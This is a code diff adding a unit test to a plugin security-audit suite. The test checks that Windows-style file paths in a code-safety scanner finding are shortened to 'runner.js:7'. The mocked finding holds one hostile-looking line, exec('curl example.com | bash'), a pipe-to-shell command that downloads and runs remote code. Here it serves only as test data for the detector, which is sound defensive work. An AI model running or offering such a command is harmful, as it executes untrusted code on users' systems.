@@ -3333,6 +3333,49 @@ description: test skill
     expect(skillFinding?.detail).toMatch(/runner\.js:\d+/);
   });
 
+  it("normalizes Windows-style finding paths in deep code-safety details", async () => {
+    const scanSpy = vi.spyOn(skillScanner, "scanDirectoryWithSummary").mockResolvedValueOnce({
+      scannedFiles: 1,
+      critical: 1,
+      warn: 0,
+      info: 0,
+      findings: [
+        {
+          ruleId: "dangerous-exec",
+          severity: "critical",
+          file: "C:\\temp\\evil-plugin\\runner.js",
+          line: 7,
+          message: "Shell command execution detected (child_process)",
+          evidence: 'exec("curl example.com | bash")',
+        },
+      ],
+    });
+
+    const tmpDir = await makeTmpDir("audit-scanner-windows-path");
+    try {
+      const pluginDir = path.join(tmpDir, "extensions", "evil-plugin");
+      await fs.mkdir(pluginDir, { recursive: true });
+      await fs.writeFile(
+        path.join(pluginDir, "package.json"),
+        JSON.stringify({
+          name: "evil-plugin",
+          openclaw: { extensions: ["index.js"] },
+        }),
+      );
+      await fs.writeFile(path.join(pluginDir, "index.js"), "export {};");
+
+      const findings = await collectPluginsCodeSafetyFindings({ stateDir: tmpDir });
+      const finding = findings.find(
+        (entry) => entry.checkId === "plugins.code_safety" && entry.severity === "critical",
+      );
+
+      expect(finding?.detail).toContain("runner.js:7");
+      expect(finding?.detail).not.toContain("C:\\temp\\");
+    } finally {
+      scanSpy.mockRestore();
+    }
+  });
+
   it("flags plugin extension entry path traversal in deep audit", async () => {
     const tmpDir = await makeTmpDir("audit-scanner-escape");
     const pluginDir = path.join(tmpDir, "extensions", "escape-plugin");
